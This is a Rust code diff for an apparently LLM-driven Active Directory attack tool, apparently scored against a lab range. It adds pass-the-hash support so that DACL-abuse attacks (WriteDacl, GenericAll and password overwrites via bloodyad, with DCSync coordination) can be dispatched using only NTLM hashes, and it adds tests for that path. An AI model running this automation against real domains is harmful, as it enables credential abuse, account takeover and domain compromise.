@@ -118,7 +118,7 @@ pub async fn auto_dacl_abuse(dispatcher: Arc<Dispatcher>, mut shutdown: watch::R
 /// Used by `auto_dacl_abuse` and exposed `pub(crate)` so the payload shape
 /// can be unit-tested without standing up a Dispatcher.
 pub(crate) fn build_dacl_payload(item: &DaclWork) -> serde_json::Value {
-    json!({
+    let mut payload = json!({
         "technique": "dacl_abuse",
         "acl_type": item.vuln_type,
         "vuln_id": item.vuln_id,
@@ -126,12 +126,20 @@ pub(crate) fn build_dacl_payload(item: &DaclWork) -> serde_json::Value {
         "target_user": item.target_user,
         "target_ip": item.dc_ip,
         "domain": item.domain,
-        "credential": {
-            "username": item.credential.username,
-            "password": item.credential.password,
-            "domain": item.credential.domain,
-        },
-    })
+    });
+    if let Some(ref cred) = item.credential {
+        payload["username"] = json!(cred.username);
+        payload["password"] = json!(cred.password);
+        payload["credential"] = json!({
+            "username": cred.username,
+            "password": cred.password,
+            "domain": cred.domain,
+        });
+    } else if let Some(ref hash) = item.hash {
+        payload["username"] = json!(hash.username);
+        payload["hash"] = json!(hash.hash_value);
+    }
+    payload
 }
 
 /// Collect DACL abuse work items from state without holding async locks.
@@ -146,7 +154,7 @@ pub(crate) fn build_dacl_payload(item: &DaclWork) -> serde_json::Value {
 /// one 50-slot `acl_chain_step` deferred bucket, so an unbounded 310-path
 /// enumeration would otherwise starve every other technique.
 pub(crate) fn collect_dacl_work(state: &StateInner) -> Vec<DaclWork> {
-    if state.credentials.is_empty() {
+    if state.credentials.is_empty() && state.hashes.is_empty() {
         return Vec::new();
     }
 
@@ -223,71 +231,87 @@ pub(crate) fn collect_dacl_work(state: &StateInner) -> Vec<DaclWork> {
             .cloned()
             .or_else(|| resolve_sid_principal(state, source_user, source_domain));
 
-        if let Some(cred) = cred {
-            let target_user = vuln
-                .details
-                .get("target")
-                .or_else(|| vuln.details.get("target_user"))
-                .or_else(|| vuln.details.get("to"))
-                .and_then(|v| v.as_str())
-                .unwrap_or("")
-                .to_string();
+        let hash = if cred.is_none() {
+            state.find_source_hash(source_user, source_domain)
+        } else {
+            None
+        };
 
-            let dispatch_domain = cred.domain.to_lowercase();
+        let Some((auth_username, auth_domain)) = cred
+            .as_ref()
+            .map(|c| (c.username.clone(), c.domain.clone()))
+            .or_else(|| {
+                hash.as_ref()
+                    .map(|h| (h.username.clone(), h.domain.clone()))
+            })
+        else {
+            continue;
+        };
 
-            if state.dominated_domains.contains(&dispatch_domain) {
-                debug!(vuln_id = %vuln.vuln_id, domain = %cred.domain, "DACL abuse skipped: domain dominated");
-                continue;
-            }
+        let target_user = vuln
+            .details
+            .get("target")
+            .or_else(|| vuln.details.get("target_user"))
+            .or_else(|| vuln.details.get("to"))
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string();
 
-            // Defer (don't mark dedup) so the next tick re-evaluates once
-            // DCSync either finishes (domain becomes dominated above) or its
-            // in-flight TTL expires and the chain runs as fallback.
-            if state.credential_capture_in_flight_for(&dispatch_domain) {
-                debug!(vuln_id = %vuln.vuln_id, domain = %cred.domain, "DACL abuse deferred: credential capture in flight");
-                continue;
-            }
+        let dispatch_domain = auth_domain.to_lowercase();
 
-            // ForceChangePassword / GenericAll overwrite the target's
-            // plaintext via `bloodyad_set_password`. Skip when we already
-            // have material so the scoreboard's back-verification against
-            // the original lab-provisioned password still holds.
-            if is_destructive_acl_type(&vtype)
-                && !target_user.is_empty()
-                && holds_target_material(state, &target_user, &dispatch_domain)
-            {
-                debug!(vuln_id = %vuln.vuln_id, target = %target_user, "Destructive ACL skipped: target material already in state");
-                continue;
-            }
-
-            let dc_ip = state
-                .domain_controllers
-                .get(&dispatch_domain)
-                .cloned()
-                .unwrap_or_default();
-
-            // When BloodHound emitted the source as a raw SID and we resolved
-            // it via `resolve_sid_principal`, surface the resolved credential's
-            // SAM account name as `source_user` — not the SID. Tool schemas
-            // require a username for credential injection by `(user, domain)`,
-            // and the LLM otherwise echoes the SID as the auth principal.
-            let dispatched_source_user = if source_user.starts_with("S-1-5-21-") {
-                cred.username.clone()
-            } else {
-                source_user.to_string()
-            };
-
-            items.push(DaclWork {
-                dedup_key,
-                vuln_id: vuln.vuln_id.clone(),
-                vuln_type: vtype,
-                source_user: dispatched_source_user,
-                target_user,
-                domain: cred.domain.clone(),
-                dc_ip,
-                credential: cred,
-            });
+        if state.dominated_domains.contains(&dispatch_domain) {
+            debug!(vuln_id = %vuln.vuln_id, domain = %auth_domain, "DACL abuse skipped: domain dominated");
+            continue;
         }
+
+        // Defer (don't mark dedup) so the next tick re-evaluates once
+        // DCSync either finishes (domain becomes dominated above) or its
+        // in-flight TTL expires and the chain runs as fallback.
+        if state.credential_capture_in_flight_for(&dispatch_domain) {
+            debug!(vuln_id = %vuln.vuln_id, domain = %auth_domain, "DACL abuse deferred: credential capture in flight");
+            continue;
+        }
+
+        // ForceChangePassword / GenericAll overwrite the target's
+        // plaintext via `bloodyad_set_password`. Skip when we already
+        // have material so the scoreboard's back-verification against
+        // the original lab-provisioned password still holds.
+        if is_destructive_acl_type(&vtype)
+            && !target_user.is_empty()
+            && holds_target_material(state, &target_user, &dispatch_domain)
+        {
+            debug!(vuln_id = %vuln.vuln_id, target = %target_user, "Destructive ACL skipped: target material already in state");
+            continue;
+        }
+
+        let dc_ip = state
+            .domain_controllers
+            .get(&dispatch_domain)
+            .cloned()
+            .unwrap_or_default();
+
+        // When BloodHound emitted the source as a raw SID and we resolved
+        // it via `resolve_sid_principal`, surface the resolved credential's
+        // SAM account name as `source_user` — not the SID. Tool schemas
+        // require a username for credential injection by `(user, domain)`,
+        // and the LLM otherwise echoes the SID as the auth principal.
+        let dispatched_source_user = if source_user.starts_with("S-1-5-21-") {
+            auth_username
+        } else {
+            source_user.to_string()
+        };
+
+        items.push(DaclWork {
+            dedup_key,
+            vuln_id: vuln.vuln_id.clone(),
+            vuln_type: vtype,
+            source_user: dispatched_source_user,
+            target_user,
+            domain: auth_domain,
+            dc_ip,
+            credential: cred,
+            hash,
+        });
     }
 
     let analysis = acl_graph::analyze(state);
@@ -309,7 +333,8 @@ pub(crate) struct DaclWork {
     pub target_user: String,
     pub domain: String,
     pub dc_ip: String,
-    pub credential: ares_core::models::Credential,
+    pub credential: Option<ares_core::models::Credential>,
+    pub hash: Option<ares_core::models::Hash>,
 }
 
 /// RIDs of well-known privileged groups whose membership is owned by privileged
@@ -874,12 +899,60 @@ mod tests {
         let state = shared.read().await;
         let work = collect_dacl_work(&state);
         assert_eq!(work.len(), 1);
-        assert_eq!(work[0].credential.username, "admin");
+        assert_eq!(work[0].credential.as_ref().unwrap().username, "admin");
         assert_eq!(work[0].vuln_type, "genericall");
         // source_user must be the resolved cred's SAM, not the raw SID — the
         // credential_resolver looks up password by `(username, domain)`, and
         // a SID never matches a credential record.
         assert_eq!(work[0].source_user, "admin");
+    }
+
+    #[tokio::test]
+    async fn collect_dispatches_source_holding_only_an_ntlm_hash() {
+        let shared = SharedState::new("test".into());
+        {
+            let mut state = shared.write().await;
+            state.hashes.push(make_hash("bob", "contoso.local"));
+            let details = acl_details("bob", "carol", "contoso.local");
+            let vuln = make_vuln("vuln-hash-001", "WriteDacl", details);
+            state
+                .discovered_vulnerabilities
+                .insert(vuln.vuln_id.clone(), vuln);
+        }
+
+        let state = shared.read().await;
+        let work = collect_dacl_work(&state);
+
+        assert_eq!(work.len(), 1);
+        assert_eq!(work[0].vuln_type, "writedacl");
+        assert_eq!(work[0].source_user, "bob");
+        assert_eq!(work[0].domain, "contoso.local");
+        assert!(work[0].credential.is_none());
+        assert_eq!(work[0].hash.as_ref().unwrap().username, "bob");
+    }
+
+    #[tokio::test]
+    async fn collect_prefers_credential_over_hash_for_same_principal() {
+        let shared = SharedState::new("test".into());
+        {
+            let mut state = shared.write().await;
+            state
+                .credentials
+                .push(make_credential("bob", "contoso.local"));
+            state.hashes.push(make_hash("bob", "contoso.local"));
+            let details = acl_details("bob", "carol", "contoso.local");
+            let vuln = make_vuln("vuln-both-001", "WriteDacl", details);
+            state
+                .discovered_vulnerabilities
+                .insert(vuln.vuln_id.clone(), vuln);
+        }
+
+        let state = shared.read().await;
+        let work = collect_dacl_work(&state);
+
+        assert_eq!(work.len(), 1);
+        assert_eq!(work[0].credential.as_ref().unwrap().username, "bob");
+        assert!(work[0].hash.is_none());
     }
 
     #[tokio::test]
@@ -1500,7 +1573,8 @@ mod tests {
             target_user: "victim".into(),
             domain: "contoso.local".into(),
             dc_ip: "192.168.58.10".into(),
-            credential: make_cred("alice", "P@ssw0rd!", "contoso.local"),
+            credential: Some(make_cred("alice", "P@ssw0rd!", "contoso.local")),
+            hash: None,
         }
     }
 
@@ -1517,6 +1591,25 @@ mod tests {
         assert_eq!(p["credential"]["username"], "alice");
         assert_eq!(p["credential"]["password"], "P@ssw0rd!");
         assert_eq!(p["credential"]["domain"], "contoso.local");
+        assert_eq!(p["username"], "alice");
+        assert!(p.get("hash").is_none());
+    }
+
+    #[test]
+    fn build_dacl_payload_falls_back_to_hash_when_no_credential() {
+        let mut item = baseline_dacl_work();
+        item.credential = None;
+        item.hash = Some(make_hash("alice", "contoso.local"));
+
+        let p = build_dacl_payload(&item);
+
+        assert_eq!(p["username"], "alice");
+        assert_eq!(
+            p["hash"],
+            "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
+        );
+        assert!(p.get("credential").is_none());
+        assert!(p.get("password").is_none());
     }
 
     #[test]
